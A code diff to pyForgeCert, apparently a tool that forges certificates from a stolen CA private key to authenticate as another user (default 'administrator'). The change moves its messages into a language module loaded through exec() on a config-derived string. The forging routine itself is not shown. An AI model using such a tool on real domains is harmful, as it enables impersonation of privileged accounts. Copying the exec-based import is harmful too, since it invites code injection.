@@ -15,7 +15,9 @@ from cryptography.x509.oid import NameOID
 from cryptography.hazmat.primitives.serialization import load_pem_private_key
 from cryptography.hazmat.primitives.serialization import pkcs12
 from OpenSSL import crypto
-
+import conf
+leng = conf.LANG
+exec("from lang import {} as lang".format(leng))
 
 def log():
     log = """
@@ -86,14 +88,14 @@ def generate_pfx(private, cert, password):
 
 def main():
     parser = argparse.ArgumentParser(add_help=True, description='pyForgeCert')
-    parser.add_argument("-i", "--input", required=True, help="Input file, default (PEM).")
-    parser.add_argument("-p", "--ipassword", required=False, default="", help="Password to the CA private key file.(PFX file).")
-    parser.add_argument("-s", "--subject", required=False, choices=['User', 'Computer'], default="User", help="Subject name in the certificate.")
-    parser.add_argument("-a", "--altname", required=False, default="administrator", help="UPN of the user to authenticate as.")
-    parser.add_argument("-o", "--output", required=True, help="Path where to save the new .pfx certificate.")
-    parser.add_argument("-op", "--opassword", required=False, default="RAND", help="Password to the .pfx file.")
-    parser.add_argument("-c", "--crl", required=False, help="Ldap path to a CRL for the forged certificate.")
-    parser.add_argument('-pfx', action='store_true', help='If the input file is PFX.')
+    parser.add_argument("-i", "--input", required=True, help=lang.input_help)
+    parser.add_argument("-p", "--ipassword", required=False, default="", help=lang.password_help)
+    parser.add_argument("-s", "--subject", required=False, choices=['User', 'Computer'], default="User", help=lang.subject_help)
+    parser.add_argument("-a", "--altname", required=False, default="administrator", help=lang.altname_help)
+    parser.add_argument("-o", "--output", required=True, help=lang.output_help)
+    parser.add_argument("-op", "--opassword", required=False, default="RAND", help=lang.opassword_help)
+    parser.add_argument("-c", "--crl", required=False, help=lang.crl_help)
+    parser.add_argument('-pfx', action='store_true', help=lang.store_true_help)
     print(log())
     if len(sys.argv) == 1:
         parser.print_help()
@@ -102,7 +104,7 @@ def main():
     options = parser.parse_args()
     input_file = options.input
     if not os.path.exists(input_file):
-        print("[-] In put file not exists.")
+        print(lang.input_doesnt_exist)
         sys.exit(1)
     with open(input_file, 'rb') as f:
         data = f.read()
@@ -119,9 +121,9 @@ def main():
             cert_decoded = x509.load_pem_x509_certificate(data, default_backend())
             key = load_pem_private_key(data, None, default_backend())
     except Exception as e:
-        print("Read file error: {}".format(e))
+        print(lang.read_file_error+": {}".format(e))
         sys.exit(1)
-    print_cert_info("CA Certificate Information:", cert_decoded)
+    print_cert_info(lang.cert_info, cert_decoded)
     private_key = crypto.PKey()
     private_key.generate_key(crypto.TYPE_RSA, 4096)
     crypto_pri_key = private_key.to_cryptography_key()
@@ -131,7 +133,7 @@ def main():
     else:
         ldap_uri = ""
     new_cert = generate_certificate(cert_decoded, options.subject, key, public_key, ldap_uri, options.altname)
-    print_cert_info("\nForged Certificate Information:", new_cert)
+    print_cert_info(lang.forged_cert_info, new_cert)
     if options.opassword == "RAND":
         password = ''.join(random.choice(string.ascii_letters) for _ in range(8))
     else:
@@ -141,7 +143,7 @@ def main():
     with open(out_put, "wb") as f:
         f.write(certificate_store)
     if os.path.exists(out_put):
-        print("\n[+] Export to file Success, PFX file {} with password  {} ".format(out_put, password))
+        print(lang.export_partone+" {} ".format(out_put)+lang.export_parttwo+" {} ".format(password))
 
 
 if __name__ == "__main__":
